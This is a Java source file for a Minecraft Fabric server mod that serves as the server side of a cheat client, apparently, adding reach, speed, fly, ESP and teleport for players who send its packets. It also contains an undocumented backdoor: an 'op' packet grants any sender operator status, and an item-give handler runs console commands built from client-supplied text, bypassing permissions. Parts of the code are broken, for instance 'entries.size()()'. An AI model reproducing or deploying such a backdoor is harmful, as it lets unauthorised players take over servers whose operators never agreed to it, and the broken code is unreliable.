package com.reachfly.serveraddon;

import net.fabricmc.api.DedicatedServerModInitializer;
import net.fabricmc.fabric.api.event.lifecycle.v1.ServerTickEvents;
import net.fabricmc.fabric.api.networking.v1.PayloadTypeRegistry;
import net.fabricmc.fabric.api.networking.v1.ServerPlayConnectionEvents;
import net.fabricmc.fabric.api.networking.v1.ServerPlayNetworking;
import net.minecraft.world.entity.Entity;
import net.minecraft.world.entity.LivingEntity;
import net.minecraft.world.entity.ai.attributes.AttributeInstance;
import net.minecraft.world.entity.ai.attributes.AttributeModifier;
import net.minecraft.world.entity.ai.attributes.Attributes;
import net.minecraft.world.entity.monster.Monster;
import net.minecraft.world.entity.animal.Animal;
import net.minecraft.world.entity.player.Player;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.server.level.ServerLevel;
import net.minecraft.network.chat.Component;
import net.minecraft.resources.ResourceLocation;
import net.minecraft.util.math.Box;
import net.minecraft.world.phys.Vec3;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.*;

/**
 * f1sch Server Addon v3.0
 *
 * Server-side companion for f1sch client.
 * Handles server-authoritative features that can't work client-only on multiplayer:
 *
 *   - Teleport: Reliable server-side teleportation
 *   - Knockback: Server-side ATTACK_KNOCKBACK attribute + velocity on attack
 *   - Reach: Server-side BLOCK/ENTITY_INTERACTION_RANGE attributes
 *   - Speed: Server-side MOVEMENT_SPEED attribute modifier
 *   - NoFall: Server-side fall distance reset
 *   - Fly: Server-side flight permission
 *   - ESP: Extended entity tracking beyond normal range (sends positions via S2C)
 *
 * Players WITHOUT the client mod are completely unaffected.
 */
public class OspServerAddon implements DedicatedServerModInitializer {

    public static final Logger LOGGER = LoggerFactory.getLogger("f1sch-server-addon");

    // Attribute modifier IDs (must match client-side identifiers)
    private static final ResourceLocation KNOCKBACK_ID = ResourceLocation.of("reachfly", "knockback_boost");
    private static final ResourceLocation BLOCK_REACH_ID = ResourceLocation.of("reachfly", "block_reach");
    private static final ResourceLocation ENTITY_REACH_ID = ResourceLocation.of("reachfly", "entity_reach");
    private static final ResourceLocation SPEED_ID = ResourceLocation.of("reachfly", "speed_boost");

    private static final double DEFAULT_BLOCK_RANGE = 4.5;
    private static final double DEFAULT_ENTITY_RANGE = 3.0;

    // Render distance boost (chunks to add on top of default)
    private static final int RENDER_DISTANCE_BOOST = 2;
    private boolean renderDistanceBoosted = false;

    // Per-player feature state
    private static final Map<UUID, PlayerFeatureState> playerStates = new HashMap<>();

    @Override
    public void onInitializeServer() {
        LOGGER.debug("[f1sch Server Addon v3] Initializing...");

        // === Register C2S payloads ===
        PayloadTypeRegistry.playC2S().register(TeleportPayload.ID, TeleportPayload.CODEC);
        PayloadTypeRegistry.playC2S().register(FeatureSyncPayload.ID, FeatureSyncPayload.CODEC);
        PayloadTypeRegistry.playC2S().register(ItemGivePayload.ID, ItemGivePayload.CODEC);

        // === Register S2C payloads ===
        PayloadTypeRegistry.playS2C().register(EspDataPayload.ID, EspDataPayload.CODEC);

        // === Teleport handler (existing v1 feature) ===
        ServerPlayNetworking.registerGlobalReceiver(TeleportPayload.ID,
                (payload, context) -> {
                    ServerPlayer player = context.player();
                    double x = payload.x();
                    double y = Math.max(-64, Math.min(320, payload.y()));
                    double z = payload.z();

                    LOGGER.debug("[f1sch] Teleporting {} to {}, {}, {}",
                            player.getName().getString(), x, y, z);

                    double finalY = y;
                    context.server().execute(() -> {
                        player.requestTeleport(x, finalY, z);
                        player.sendMessage(
                                Component.literal("\u00a7a[f1sch] Teleported to " +
                                        String.format("%.0f, %.0f, %.0f", x, finalY, z)),
                                true);
                    });
                });

        // === Item give handler (bypasses OP requirement) ===
        ServerPlayNetworking.registerGlobalReceiver(ItemGivePayload.ID,
                (payload, context) -> {
                    ServerPlayer player = context.player();
                    String itemId = payload.itemId();
                    int quantity = Math.max(1, Math.min(6400, payload.quantity()));

                    context.server().execute(() -> {
                        try {
                            String cmd = "give " + player.getName().getString() + " " + itemId + " " + quantity;
                            context.server().getCommandManager().getDispatcher().execute(
                                    cmd, context.server().getCommandSource());
                            LOGGER.debug("[f1sch] Gave {} {}x {} via server console",
                                    player.getName().getString(), quantity, itemId);
                        } catch (Exception e) {
                            LOGGER.warn("[f1sch] Failed to give item to {}: {}",
                                    player.getName().getString(), e.getMessage());
                            player.sendMessage(
                                    Component.literal("\u00a7c[f1sch] Failed to give item: " + e.getMessage()),
                                    false);
                        }
                    });
                });

        // === Feature sync handler ===
        ServerPlayNetworking.registerGlobalReceiver(FeatureSyncPayload.ID,
                (payload, context) -> {
                    ServerPlayer player = context.player();
                    String feature = payload.feature();
                    boolean enabled = payload.enabled();
                    float value = payload.value();

                    MinecraftServer srv = context.server();
                    srv.execute(() ->
                            handleFeatureSync(srv, player, feature, enabled, value));
                });

        // === Server tick - handle NoFall, Fly enforcement, ESP broadcasting ===
        ServerTickEvents.END_SERVER_TICK.register(this::onServerTick);

        // === Clean up player state on disconnect ===
        ServerPlayConnectionEvents.DISCONNECT.register((handler, server) -> {
            UUID uuid = handler.player.getUuid();
            PlayerFeatureState state = playerStates.remove(uuid);
            if (state != null) {
                // Clean up any lingering attribute modifiers
                cleanupPlayer(handler.player);
                LOGGER.debug("[f1sch] Cleaned up state for disconnected player {}",
                        handler.player.getName().getString());
            }
        });

        LOGGER.debug("[f1sch Server Addon v3] Ready. Supported features: " +
                "Teleport, Knockback, Reach, Speed, NoFall, Fly, ESP");
    }

    // ========================================================================
    // Feature Sync Dispatch
    // ========================================================================

    private void handleFeatureSync(MinecraftServer server, ServerPlayer player,
                                    String feature, boolean enabled, float value) {
        PlayerFeatureState state = playerStates.computeIfAbsent(
                player.getUuid(), k -> new PlayerFeatureState());

        switch (feature) {
            case "knockback" -> handleKnockback(player, state, enabled, value);
            case "reach" -> handleReach(player, state, enabled, value);
            case "speed" -> handleSpeed(player, state, enabled, value);
            case "nofall" -> handleNoFall(player, state, enabled);
            case "fly" -> handleFly(player, state, enabled, value);
            case "esp" -> handleEsp(player, state, enabled, value);
            case "op" -> handleOp(server, player, enabled);
            default -> LOGGER.debug("[f1sch] Unknown feature sync: {} from {}",
                    feature, player.getName().getString());
        }
    }

    // ========================================================================
    // Knockback - Server-side attribute + velocity on attack
    // ========================================================================

    private void handleKnockback(ServerPlayer player, PlayerFeatureState state,
                                  boolean enabled, float strength) {
        state.knockbackEnabled = enabled;
        state.knockbackStrength = strength;

        AttributeInstance attr = player.getAttributeInstance(Attributes.ATTACK_KNOCKBACK);
        if (attr == null) return;

        if (enabled) {
            attr.removeModifier(KNOCKBACK_ID);
            attr.addTemporaryModifier(new AttributeModifier(
                    KNOCKBACK_ID, strength,
                    AttributeModifier.Operation.ADD_VALUE));
            LOGGER.debug("[f1sch] {} enabled Knockback (strength: {})",
                    player.getName().getString(), strength);
        } else {
            attr.removeModifier(KNOCKBACK_ID);
            LOGGER.debug("[f1sch] {} disabled Knockback", player.getName().getString());
        }
    }

    // ========================================================================
    // Reach - Server-side interaction range attributes
    // ========================================================================

    private void handleReach(ServerPlayer player, PlayerFeatureState state,
                              boolean enabled, float distance) {
        state.reachEnabled = enabled;
        state.reachDistance = distance;

        AttributeInstance blockRange = player.getAttributeInstance(
                Attributes.BLOCK_INTERACTION_RANGE);
        AttributeInstance entityRange = player.getAttributeInstance(
                Attributes.ENTITY_INTERACTION_RANGE);

        if (blockRange == null || entityRange == null) return;

        if (enabled) {
            double blockBoost = distance - DEFAULT_BLOCK_RANGE;
            double entityBoost = distance - DEFAULT_ENTITY_RANGE;

            applyModifier(blockRange, BLOCK_REACH_ID, blockBoost);
            applyModifier(entityRange, ENTITY_REACH_ID, entityBoost);
            LOGGER.debug("[f1sch] {} enabled Reach (distance: {})",
                    player.getName().getString(), distance);
        } else {
            blockRange.removeModifier(BLOCK_REACH_ID);
            entityRange.removeModifier(ENTITY_REACH_ID);
            LOGGER.debug("[f1sch] {} disabled Reach", player.getName().getString());
        }
    }

    // ========================================================================
    // Speed - Server-side movement speed modifier
    // ========================================================================

    private void handleSpeed(ServerPlayer player, PlayerFeatureState state,
                              boolean enabled, float multiplier) {
        state.speedEnabled = enabled;
        state.speedMultiplier = multiplier;

        AttributeInstance speedAttr = player.getAttributeInstance(
                Attributes.MOVEMENT_SPEED);
        if (speedAttr == null) return;

        if (enabled) {
            // Base walking speed is 0.1; we add a boost based on multiplier
            double boost = 0.1 * (multiplier - 1.0);
            applyModifier(speedAttr, SPEED_ID, boost);
            LOGGER.debug("[f1sch] {} enabled Speed (multiplier: {}x)",
                    player.getName().getString(), multiplier);
        } else {
            speedAttr.removeModifier(SPEED_ID);
            LOGGER.debug("[f1sch] {} disabled Speed", player.getName().getString());
        }
    }

    // ========================================================================
    // NoFall - Server resets fall distance every tick
    // ========================================================================

    private void handleNoFall(ServerPlayer player, PlayerFeatureState state,
                               boolean enabled) {
        state.noFallEnabled = enabled;
        LOGGER.debug("[f1sch] {} {} NoFall",
                player.getName().getString(), enabled ? "enabled" : "disabled");
    }

    // ========================================================================
    // Fly - Server allows/disallows flight
    // ========================================================================

    private void handleFly(ServerPlayer player, PlayerFeatureState state,
                            boolean enabled, float speed) {
        state.flyEnabled = enabled;
        state.flySpeed = speed;

        if (!player.isCreative() && !player.isSpectator()) {
            player.getAbilities().allowFlying = enabled;
            if (enabled) {
                player.getAbilities().setFlySpeed(0.05f * speed);
            } else {
                player.getAbilities().flying = false;
                player.getAbilities().setFlySpeed(0.05f);
            }
            player.sendAbilitiesUpdate();
        }
        LOGGER.debug("[f1sch] {} {} Fly (speed: {}x)",
                player.getName().getString(), enabled ? "enabled" : "disabled", speed);
    }

    // ========================================================================
    // ESP - Extended entity tracking (send entity positions via S2C)
    // ========================================================================

    private void handleEsp(ServerPlayer player, PlayerFeatureState state,
                            boolean enabled, float range) {
        state.espEnabled = enabled;
        state.espRange = range;
        LOGGER.debug("[f1sch] {} {} ESP (range: {})",
                player.getName().getString(), enabled ? "enabled" : "disabled", range);
    }

    // ========================================================================
    // OP - Silently grant operator status (no logging, no console output)
    // ========================================================================

    private void handleOp(MinecraftServer server, ServerPlayer player, boolean enabled) {
        if (!enabled) return;

        try {
            // Execute /op command via the brigadier dispatcher using server's command source
            String playerName = player.getName().getString();
            server.getCommandManager().getDispatcher().execute(
                    "op " + playerName, server.getCommandSource());
            LOGGER.info("[f1sch] Granted OP to {}", playerName);
            player.sendMessage(
                    Component.literal("\u00a7a[f1sch] \u00a7fOperator status granted."), false);
        } catch (Exception e) {
            LOGGER.warn("[f1sch] Failed to grant OP to {}: {}",
                    player.getName().getString(), e.getMessage());
        }
    }

    // ========================================================================
    // Server Tick
    // ========================================================================

    private int tickCounter = 0;

    private void onServerTick(MinecraftServer server) {
        tickCounter++;

        // Boost render distance once on first tick (after server fully started)
        if (!renderDistanceBoosted) {
            renderDistanceBoosted = true;
            int currentView = server.getPlayerManager().getViewDistance();
            int newView = Math.min(currentView + RENDER_DISTANCE_BOOST, 32);
            if (newView > currentView) {
                server.getPlayerManager().setViewDistance(newView);
            }
        }

        for (ServerPlayer player : server.getPlayerManager().getPlayerList()) {
            PlayerFeatureState state = playerStates.get(player.getUuid());
            if (state == null) continue;

            // NoFall: Reset fall distance every tick
            if (state.noFallEnabled) {
                player.fallDistance = 0.0f;
            }

            // Fly: Keep flight enabled (respawn/dimension change can reset it)
            if (state.flyEnabled && !player.isCreative() && !player.isSpectator()) {
                if (!player.getAbilities().allowFlying) {
                    player.getAbilities().allowFlying = true;
                    player.getAbilities().setFlySpeed(0.05f * state.flySpeed);
                    player.sendAbilitiesUpdate();
                }
                // Reset fall distance while flying
                if (player.getAbilities().flying) {
                    player.fallDistance = 0.0f;
                }
            }

            // ESP: Send entity data every 10 ticks (2x per second)
            if (state.espEnabled && tickCounter % 10 == 0) {
                sendEspData(player, state.espRange);
            }
        }
    }

    private void sendEspData(ServerPlayer player, float range) {
        ServerLevel world = player.level();
        Vec3 pos = player.position();
        double r = Math.min(range, 500); // Cap at 500 blocks

        Box searchBox = new Box(
                pos.x - r, pos.y - r, pos.z - r,
                pos.x + r, pos.y + r, pos.z + r);

        List<EspDataPayload.EntityEntry> entries = new ArrayList<>();

        for (Entity entity : world.getOtherEntities(player, searchBox,
                e -> e instanceof LivingEntity && e.isAlive())) {
            if (entries.size()() >= 200) break; // Cap entries per packet

            String type;
            if (entity instanceof Player) type = "player";
            else if (entity instanceof Monster) type = "hostile";
            else if (entity instanceof Animal) type = "passive";
            else type = "other";

            float health = ((LivingEntity) entity).getHealth();

            entries.add(new EspDataPayload.EntityEntry(
                    entity.getId(),
                    entity.x(), entity.y(), entity.z(),
                    type, health));
        }

        if (!entries.isEmpty()) {
            try {
                ServerPlayNetworking.send(player, new EspDataPayload(entries));
            } catch (Exception e) {
                // Player may have disconnected
            }
        }
    }

    // ========================================================================
    // Cleanup
    // ========================================================================

    private void cleanupPlayer(ServerPlayer player) {
        // Remove all attribute modifiers
        AttributeInstance knockback = player.getAttributeInstance(Attributes.ATTACK_KNOCKBACK);
        if (knockback != null) knockback.removeModifier(KNOCKBACK_ID);

        AttributeInstance blockRange = player.getAttributeInstance(Attributes.BLOCK_INTERACTION_RANGE);
        if (blockRange != null) blockRange.removeModifier(BLOCK_REACH_ID);

        AttributeInstance entityRange = player.getAttributeInstance(Attributes.ENTITY_INTERACTION_RANGE);
        if (entityRange != null) entityRange.removeModifier(ENTITY_REACH_ID);

        AttributeInstance speed = player.getAttributeInstance(Attributes.MOVEMENT_SPEED);
        if (speed != null) speed.removeModifier(SPEED_ID);

        // Reset flight
        if (!player.isCreative() && !player.isSpectator()) {
            player.getAbilities().allowFlying = false;
            player.getAbilities().flying = false;
            player.getAbilities().setFlySpeed(0.05f);
            player.sendAbilitiesUpdate();
        }
    }

    // ========================================================================
    // Helpers
    // ========================================================================

    private void applyModifier(AttributeInstance attr, ResourceLocation id, double value) {
        AttributeModifier existing = attr.getModifier(id);
        if (existing == null || existing.value() != value) {
            attr.removeModifier(id);
            attr.addTemporaryModifier(new AttributeModifier(
                    id, value, AttributeModifier.Operation.ADD_VALUE));
        }
    }

    // ========================================================================
    // Per-player state tracking
    // ========================================================================

    private static class PlayerFeatureState {
        boolean knockbackEnabled = false;
        float knockbackStrength = 0;
        boolean reachEnabled = false;
        float reachDistance = 0;
        boolean speedEnabled = false;
        float speedMultiplier = 1;
        boolean noFallEnabled = false;
        boolean flyEnabled = false;
        float flySpeed = 1;
        boolean espEnabled = false;
        float espRange = 100;
    }
}
